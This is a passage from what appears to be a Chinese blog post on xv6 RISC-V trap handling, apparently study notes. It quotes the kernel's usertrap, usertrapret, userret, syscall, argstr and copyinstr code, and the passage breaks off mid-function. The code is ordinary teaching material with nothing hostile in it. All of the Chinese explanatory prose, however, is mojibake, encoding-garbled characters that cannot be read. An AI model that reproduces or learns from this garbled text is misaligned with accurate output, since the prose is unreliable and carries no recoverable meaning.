<p>å…·ä½“è¯¥æ€ä¹ˆä¿å­˜æ‰€æœ‰çš„å¯„å­˜å™¨çš„å€¼ï¼Œå°±ç‰µæ‰¯åˆ°äº†å¦ä¸€ä¸ªæœºåˆ¶<code>é™·é˜±å¸§</code>ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œé™·é˜±å¸§å°±æ˜¯<code>trapframe</code>,è¯¥å¸§æœ‰ä¿å­˜ç”¨æˆ·æ‰€æœ‰çš„å¯„å­˜å™¨çš„ç©ºé—´ã€‚æ­¤æ—¶<code>satp</code>è¿˜æ˜¯æŒ‡å‘äº†ç”¨æˆ·é¡µè¡¨ï¼Œæ‰€ä»¥è¦ä½¿ç”¨è¿™ä¸ªé™·é˜±å¸§è¿˜å¾—æŠŠä»–æ˜ å°„åˆ°ç”¨æˆ·é¡µè¡¨ä¸­ï¼Œ<code>sscratch</code>å°±æŒ‡å‘äº†è¿™ä¸ªé™·é˜±å¸§ï¼Œæ‰§è¡Œå®Œ<code>csrrw</code>å<code>a0</code>å¯„å­˜å™¨å°±æŒ‡å‘äº†é™·é˜±å¸§ï¼Œç„¶å<code>uservec</code>å°±åˆ©ç”¨a0æŠŠæ‰€æœ‰ç”¨æˆ·å¯„å­˜å™¨ä¿å­˜åœ¨é™·é˜±å¸§ï¼Œé™·é˜±å¸§ä¸­è¿˜åŒ…å«äº†æŒ‡å‘å½“å‰è¿›ç¨‹å†…æ ¸æ ˆçš„æŒ‡é’ˆï¼Œå½“å‰cpuçš„<code>hartid</code>,<code>usertrap</code>çš„åœ°å€ä»¥åŠå†…æ ¸é¡µè¡¨çš„åœ°å€ï¼Œ<code>uservec</code>å°±å–å¾—è¿™äº›å€¼ï¼Œå°†<code>satp</code>åˆ‡æ¢åˆ°å†…æ ¸é¡µè¡¨ï¼Œå¹¶è°ƒç”¨<code>usertrap</code>ã€‚</p>
<p><strong>usertrap</strong></p>
<p>ä¸‹é¢æ˜¯xv6 usertrapä»£ç </p>
<p>ä»£ç æ¯”è¾ƒæ¸…æ™°ï¼Œé¦–å…ˆä¼šæ£€æŸ¥ä¸Šä¸€ä¸ªæ¨¡å¼æ˜¯ä»€ä¹ˆï¼Œç„¶åè®¾ç½®<code>stvec</code>,å› ä¸ºæ­¤æ—¶cpuå·²ç»å¤„äºå†…æ ¸æ€äº†ï¼Œå½“å‘ç”Ÿtrapæ—¶å¾—æ‰§è¡Œå†…æ ¸çš„<code>kernelvec</code>è€Œä¸æ˜¯<code>suervec</code>,æ‰€ä»¥ä¼šæŠŠ<code>stvec</code>æŒ‡å‘<code>kernelvec</code>,ç„¶åä¿å­˜äº†sepcåˆ°p-&gt;trapframe-&gt;sepcä¸­é˜²æ­¢è¢«è¦†ç›–ï¼Œç„¶ååˆ¤æ–­trapçš„ç±»å‹ï¼Œå¦‚æœæ˜¯ç³»ç»Ÿè°ƒç”¨<code>syscall()</code>ä¼šå¤„ç†ï¼Œå¦‚æœæ˜¯è®¾å¤‡ä¸­æ–­ï¼Œ<code>devintr</code>ä¼šå¤„ç†ä»–ï¼Œå¦åˆ™å°±æ˜¯ä¸€ä¸ªå¼‚å¸¸ï¼Œå°±è®¾ç½®<code>p-&gt;killed=1</code>,ä»£è¡¨ä¼šè¢«æ€æ­»ï¼Œæœ€åå†…æ ¸æ£€æŸ¥è¿›ç¨‹æ˜¯å¦åº”è¯¥è¢«æ€æ­»æˆ–è€…å› ä¸ºæ—¶é’Ÿä¸­æ–­è®©å‡ºcpu,æœ€åè°ƒç”¨<code>usertrapret</code>,æµç¨‹æ¯”èµ·<code>uservec</code>å¥½ç†è§£å¤šäº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">usertrap</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((r_sstatus() &amp; SSTATUS_SPP) != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;usertrap: not from user mode&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send interrupts and exceptions to kerneltrap(),</span></span><br><span class="line">  <span class="comment">// since we&#x27;re now in the kernel.</span></span><br><span class="line">  w_stvec((uint64)kernelvec);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// save user program counter.</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = r_sepc();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(r_scause() == <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="comment">// system call</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sepc points to the ecall instruction,</span></span><br><span class="line">    <span class="comment">// but we want to return to the next instruction.</span></span><br><span class="line">    p-&gt;trapframe-&gt;epc += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// an interrupt will change sstatus &amp;c registers,</span></span><br><span class="line">    <span class="comment">// so don&#x27;t enable until done with those registers.</span></span><br><span class="line">    intr_on();</span><br><span class="line"></span><br><span class="line">    syscall();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>((which_dev = devintr()) != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// ok</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, r_scause(), p-&gt;pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">    p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)</span><br><span class="line">    yield();</span><br><span class="line"></span><br><span class="line">  usertrapret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>usertrapret</strong></p>
<p>é¦–å…ˆæ˜¯è·å¾—è¿›ç¨‹çš„procç»“æ„ä½“ï¼Œç„¶åæ˜¯<code>intr_off</code>è®¾ç½®äº†sstatusçš„<code>sie</code>ä½ï¼Œç„¶åæ˜¯è®¾ç½®äº†<code>stvec</code>ï¼Œå› ä¸ºè¦è¿”å›ç”¨æˆ·æ€äº†ï¼Œæ‰€ä»¥trapå¤„ç†ç¨‹åºå˜æˆäº†<code>uservec</code>,ç„¶åæ˜¯åœ¨é™·é˜±å¸§ä¸­è®°å½•å†…æ ¸é¡µè¡¨åœ°å€ï¼Œspåœ°å€ï¼Œ<code>usertrap</code>åœ°å€ï¼Œä»¥åŠ<code>hartid</code>ã€‚ç„¶åæ˜¯è®¾ç½®sstatusçš„sspä½ï¼ŒæŠŠä¸Šä¸€ä¸ªæ¨¡å¼è®¾ç½®ä¸ºuser-mode,ç„¶åæ˜¯è®¾ç½®sepcå¾—åˆ°ç”¨æˆ·æ€é¡µè¡¨åœ°å€ï¼Œç„¶ååˆè·³å›<code>trampoline</code>ä¸­æ‰§è¡Œ<code>userret</code>,è‡³äºä¸ºä»€ä¹ˆè¦æŠŠ<code>userret</code>å‡½æ•°æ”¾ç½®åœ¨<code>trampoline</code>ä¸­ï¼Œæ˜¯å› ä¸º<code>userret</code>ä¸­ä¼šåˆ‡æ¢é¡µè¡¨ã€‚è¦æƒ³åˆ‡æ¢å®Œé¡µè¡¨è¿˜èƒ½ç»§ç»­æ‰§è¡Œ<code>userret</code>åªèƒ½æŠŠä»–æ”¾åœ¨<code>trampoline</code>ä¸­ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">usertrapret</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// we&#x27;re about to switch the destination of traps from</span></span><br><span class="line">  <span class="comment">// kerneltrap() to usertrap(), so turn off interrupts until</span></span><br><span class="line">  <span class="comment">// we&#x27;re back in user space, where usertrap() is correct.</span></span><br><span class="line">  intr_off();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send syscalls, interrupts, and exceptions to trampoline.S</span></span><br><span class="line">  w_stvec(TRAMPOLINE + (uservec - trampoline));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set up trapframe values that uservec will need when</span></span><br><span class="line">  <span class="comment">// the process next re-enters the kernel.</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_satp = r_satp();         <span class="comment">// kernel page table</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_sp = p-&gt;kstack + PGSIZE; <span class="comment">// process&#x27;s kernel stack</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_trap = (uint64)usertrap;</span><br><span class="line">  p-&gt;trapframe-&gt;kernel_hartid = r_tp();         <span class="comment">// hartid for cpuid()</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// set up the registers that trampoline.S&#x27;s sret will use</span></span><br><span class="line">  <span class="comment">// to get to user space.</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// set S Previous Privilege mode to User.</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> x = r_sstatus();</span><br><span class="line">  x &amp;= ~SSTATUS_SPP; <span class="comment">// clear SPP to 0 for user mode</span></span><br><span class="line">  x |= SSTATUS_SPIE; <span class="comment">// enable interrupts in user mode</span></span><br><span class="line">  w_sstatus(x);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set S Exception Program Counter to the saved user pc.</span></span><br><span class="line">  w_sepc(p-&gt;trapframe-&gt;epc);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// tell trampoline.S the user page table to switch to.</span></span><br><span class="line">  uint64 satp = MAKE_SATP(p-&gt;pagetable);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// jump to trampoline.S at the top of memory, which </span></span><br><span class="line">  <span class="comment">// switches to the user page table, restores user registers,</span></span><br><span class="line">  <span class="comment">// and switches to user mode with sret.</span></span><br><span class="line">  uint64 fn = TRAMPOLINE + (userret - trampoline);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(uint64,uint64))fn)(TRAPFRAME, satp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>userret</strong></p>
<p>a1ä¿å­˜çš„æ˜¯ç”¨æˆ·æ€é¡µè¡¨åœ°å€ï¼Œa0ä¿å­˜çš„æ˜¯<code>trampoline</code>åœ°å€ï¼Œé¦–å…ˆåˆ‡æ¢é¡µè¡¨ï¼Œç„¶åä»é™·é˜±å¸§ä¸­æ¢å¤ç”¨æˆ·å¯„å­˜å™¨ï¼Œæœ€åè°ƒç”¨<code>sret</code>å®Œæˆå¯¹ç”¨æˆ·æ€çš„åˆ‡æ¢ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">.globl userret</span><br><span class="line">userret:</span><br><span class="line">        # userret(TRAPFRAME, pagetable)</span><br><span class="line">        # switch from kernel to user.</span><br><span class="line">        # usertrapret() calls here.</span><br><span class="line">        # a0: TRAPFRAME, in user page table.</span><br><span class="line">        # a1: user page table, for satp.</span><br><span class="line"></span><br><span class="line">        # switch to the user page table.</span><br><span class="line">        csrw satp, a1</span><br><span class="line">        sfence.vma zero, zero</span><br><span class="line"></span><br><span class="line">        # put the saved user a0 in sscratch, so we</span><br><span class="line">        # can swap it with our a0 (TRAPFRAME) in the last step.</span><br><span class="line">        ld t0, 112(a0)</span><br><span class="line">        csrw sscratch, t0</span><br><span class="line"></span><br><span class="line">        # restore all but a0 from TRAPFRAME</span><br><span class="line">        ld ra, 40(a0)</span><br><span class="line">        ld sp, 48(a0)</span><br><span class="line">        ld gp, 56(a0)</span><br><span class="line">        ld tp, 64(a0)</span><br><span class="line">        ld t0, 72(a0)</span><br><span class="line">        ld t1, 80(a0)</span><br><span class="line">        ld t2, 88(a0)</span><br><span class="line">        ld s0, 96(a0)</span><br><span class="line">        ld s1, 104(a0)</span><br><span class="line">        ld a1, 120(a0)</span><br><span class="line">        ld a2, 128(a0)</span><br><span class="line">        ld a3, 136(a0)</span><br><span class="line">        ld a4, 144(a0)</span><br><span class="line">        ld a5, 152(a0)</span><br><span class="line">        ld a6, 160(a0)</span><br><span class="line">        ld a7, 168(a0)</span><br><span class="line">        ld s2, 176(a0)</span><br><span class="line">        ld s3, 184(a0)</span><br><span class="line">        ld s4, 192(a0)</span><br><span class="line">        ld s5, 200(a0)</span><br><span class="line">        ld s6, 208(a0)</span><br><span class="line">        ld s7, 216(a0)</span><br><span class="line">        ld s8, 224(a0)</span><br><span class="line">        ld s9, 232(a0)</span><br><span class="line">        ld s10, 240(a0)</span><br><span class="line">        ld s11, 248(a0)</span><br><span class="line">        ld t3, 256(a0)</span><br><span class="line">        ld t4, 264(a0)</span><br><span class="line">        ld t5, 272(a0)</span><br><span class="line">        ld t6, 280(a0)</span><br><span class="line"></span><br><span class="line">	# restore user a0, and save TRAPFRAME in sscratch</span><br><span class="line">        csrrw a0, sscratch, a0</span><br><span class="line">        </span><br><span class="line">        # return to user mode and user pc.</span><br><span class="line">        # usertrapret() set up sstatus and sepc.</span><br><span class="line">        sret</span><br></pre></td></tr></table></figure>

<p>å€ŸåŠ©ä»ç”¨æˆ·æ€çš„é™·å…¥ç»ˆäºç†æ¸…äº†xv6çš„ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„è½¬æ¢äº†ï¼Œå—ç›ŠåŒªæµ…ã€‚</p>
<p><strong>è°ƒç”¨ç³»ç»Ÿè°ƒç”¨</strong></p>
<p><code>syscall</code>ä»£ç å¦‚ä¸‹ï¼Œä»£ç ç®€ç•¥æ¸…æ™°ï¼Œå°±ä»¥<code>exec</code>è°ƒç”¨ä½ä¾‹å­ï¼Œä¸¤ä¸ªå‚æ•°åˆ†åˆ«å­˜æ”¾åœ¨a0,å’Œa1ä¸­ï¼Œç„¶åæŠŠç³»ç»Ÿè°ƒç”¨å·æ”¾åœ¨a7ä¸­ï¼Œç³»ç»Ÿè°ƒç”¨å·å°±æ˜¯<code>syscall[]</code>çš„ä¸‹æ ‡ï¼Œå¯»æ‰¾åˆ°çš„å€¼å°±æ˜¯è¯¥ç³»ç»Ÿè°ƒç”¨çš„å¤„ç†å‡½æ•°ï¼Œ<code>exec</code>ç³»ç»Ÿè°ƒç”¨æœ€åå°±ä¼šè°ƒç”¨<code>sys_exec</code>ã€‚æ­¤æ—¶ä¼šæœ‰ä¸ªç–‘é—®ï¼Œç³»ç»Ÿè°ƒç”¨éƒ½æ˜¯æœ‰å‚æ•°çš„ï¼Œä¸ºä»€ä¹ˆæœ€åçš„<code>p-&gt;trapframe-&gt;a0 = syscalls[num]();</code>æ²¡æœ‰å‘¢ï¼Œæˆ‘å¤§æ¦‚çœ‹äº†<code>sys_exec</code>çš„ä»£ç ï¼Œå‘ç°ä»–æ˜¯ç›´æ¥ä»é™·é˜±å¸§ä¸­å–å¯„å­˜å™¨å€¼çš„ï¼Œè€Œä¸æ˜¯ä¼ å‚ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="keyword">void</span>)</span> </span>= &#123;</span><br><span class="line">[SYS_fork]    sys_fork,</span><br><span class="line">[SYS_exit]    sys_exit,</span><br><span class="line">[SYS_wait]    sys_wait,</span><br><span class="line">[SYS_pipe]    sys_pipe,</span><br><span class="line">[SYS_read]    sys_read,</span><br><span class="line">[SYS_kill]    sys_kill,</span><br><span class="line">[SYS_exec]    sys_exec,</span><br><span class="line">[SYS_fstat]   sys_fstat,</span><br><span class="line">[SYS_chdir]   sys_chdir,</span><br><span class="line">[SYS_dup]     sys_dup,</span><br><span class="line">[SYS_getpid]  sys_getpid,</span><br><span class="line">[SYS_sbrk]    sys_sbrk,</span><br><span class="line">[SYS_sleep]   sys_sleep,</span><br><span class="line">[SYS_uptime]  sys_uptime,</span><br><span class="line">[SYS_open]    sys_open,</span><br><span class="line">[SYS_write]   sys_write,</span><br><span class="line">[SYS_mknod]   sys_mknod,</span><br><span class="line">[SYS_unlink]  sys_unlink,</span><br><span class="line">[SYS_link]    sys_link,</span><br><span class="line">[SYS_mkdir]   sys_mkdir,</span><br><span class="line">[SYS_close]   sys_close,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">syscall</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %s: unknown sys call %d\n&quot;</span>,</span><br><span class="line">            p-&gt;pid, p-&gt;name, num);</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ç³»ç»Ÿè°ƒç”¨å‚æ•°"><a href="#ç³»ç»Ÿè°ƒç”¨å‚æ•°" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨å‚æ•°"></a>ç³»ç»Ÿè°ƒç”¨å‚æ•°</h5><p>å¥½å®¶ä¼™ï¼Œæˆ‘åˆšæœ‰è¿™ä¸ªç–‘é—®ï¼Œä¹¦çš„ä¸‹ä¸€èŠ‚å°±è§£é‡Šè¿™ä¸ªé—®é¢˜ï¼Œç‰›å•Šã€‚</p>
<p>ç³»ç»Ÿæä¾›ä¸‰ä¸ªå‡½æ•°artint,artaddr,artfdä»é™·é˜±å¸§ä¸­æ£€ç´¢ç¬¬<code>n</code>ä¸ªç³»ç»Ÿè°ƒç”¨å‚æ•°å¹¶ä¸”ä»¥æ•´æ•°ï¼ŒæŒ‡é’ˆï¼Œæˆ–è€…æ–‡ä»¶æè¿°ç¬¦çš„å½¢å¼ä¿å­˜ï¼Œä»–ä»¬éƒ½è°ƒç”¨<code>argraw</code>æ¥æ£€ç´¢ç›¸åº”çš„ä¿å­˜çš„ç”¨æˆ·å¯„å­˜å™¨ã€‚æ¯”å¦‚<code>argstr</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">argstr(<span class="keyword">int</span> n, <span class="keyword">char</span> *buf, <span class="keyword">int</span> max)</span><br><span class="line">&#123;</span><br><span class="line">  uint64 addr;</span><br><span class="line">  <span class="keyword">if</span>(argaddr(n, &amp;addr) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> fetchstr(addr, buf, max);</span><br><span class="line">&#125;</span><br><span class="line">argaddr(<span class="keyword">int</span> n, uint64 *ip)</span><br><span class="line">&#123;</span><br><span class="line">  *ip = argraw(n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†…æ ¸è¦æƒ³è·å¾—ä¸€ä¸ªæ•´æ•°è¿˜è¡Œï¼Œä½†æ˜¯è¦æƒ³è·å¾—ç”¨æˆ·æ€çš„æŸä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€…æŸä¸€æ®µå†…å­˜çš„å€¼å°±ä¸å¥½åŠäº†ï¼Œå› ä¸ºæ­¤æ—¶å¤„äºå†…æ ¸æ€ï¼Œé¡µè¡¨æ˜¯å†…æ ¸é¡µè¡¨ï¼Œå¹¶ä¸èƒ½è®¿é—®ç”¨æˆ·æ€çš„å†…å­˜ï¼Œå¯ä»¥çœ‹çœ‹xv6æ˜¯å¦‚ä½•å®Œæˆçš„ã€‚</p>
<p><code>copyinstr</code>å‡½æ•°å°±æ˜¯å®Œæˆåœ¨å†…æ ¸æ€ä»ç”¨æˆ·æ€åˆ°å†…æ ¸æ€æ‹·è´æ•°æ®çš„å‡½æ•°ï¼Œä¼ å…¥çš„å‚æ•°æœ‰è¿›ç¨‹çš„é™·é˜±å¸§ï¼Œå†…æ ¸æ¥æ”¶åœ°å€dstå’Œç”¨æˆ·æ€åœ°å€srcvaä»¥åŠæ‹·è´é‡maxã€‚æˆ‘ç®€è¿°ä¸€ä¸‹åŸç†ï¼Œå°±æ˜¯åˆ©ç”¨ä¼ è¿›æ¥çš„ç”¨æˆ·æ€è™šæ‹Ÿåœ°å€srcvaå’Œè¿›ç¨‹çš„é™·é˜±å¸§å®Œæˆå¯¹è¿™ä¸ªè™šæ‹Ÿåœ°å€æ‰€æ˜ å°„çš„ç‰©ç†åœ°å€<code>pa0</code>çš„æŸ¥è¯¢ï¼ŒæŸ¥è¯¢è¿‡ç¨‹å°±æ˜¯åˆ©ç”¨é™·é˜±å¸§è®°å½•çš„ç”¨æˆ·æ€é¡µè¡¨ï¼Œç„¶åé€šè¿‡è¿™ä¸ªè™šæ‹Ÿåœ°å€æ‰¾åˆ°å¯¹åº”ç‰©ç†åœ°å€è¿”å›ï¼Œåœ¨å†…æ ¸æ€ä¸­ï¼Œç”±äºå†…æ ¸å°†æ‰€æœ‰ç‰©ç†RAMåœ°å€æ˜ å°„åˆ°åŒä¸€ä¸ªå†…æ ¸è™šæ‹Ÿåœ°å€ï¼Œ<code>copyinstr</code>å¯ä»¥ç›´æ¥å°†å­—ç¬¦ä¸²å­—èŠ‚ä»<code>pa0</code>å¤åˆ¶åˆ°<code>dst</code>ï¼ˆè¿™æ®µå…¶å®ä¸æ˜¯å¾ˆç†è§£ï¼Œæˆ‘ä¸ç¡®å®šè¿™ä¸ªpa0åˆ°åº•æ˜¯ä¸æ˜¯ç‰©ç†åœ°å€ï¼Œå¦‚æœæ˜¯çš„è¯<code>copyinstr</code>ç›´æ¥ä½¿ç”¨ç‰©ç†åœ°å€è¿›è¡Œcopy<code>*dst = *p</code>,é‚£å”¯ä¸€çš„è§£é‡Šå°±æ˜¯æ˜ å°„æ˜¯ç›´æ¥æ˜ å°„ï¼Œå³è™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€æ˜¯ä¸€ä¸€å¯¹åº”çš„æ‰å¯ä»¥ï¼‰ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">copyinstr(<span class="keyword">pagetable_t</span> pagetable, <span class="keyword">char</span> *dst, uint64 srcva, uint64 max)</span><br><span class="line">&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line">  <span class="keyword">int</span> got_null = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(got_null == <span class="number">0</span> &amp;&amp; max &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(srcva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (srcva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; max)</span><br><span class="line">      n = max;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *p = 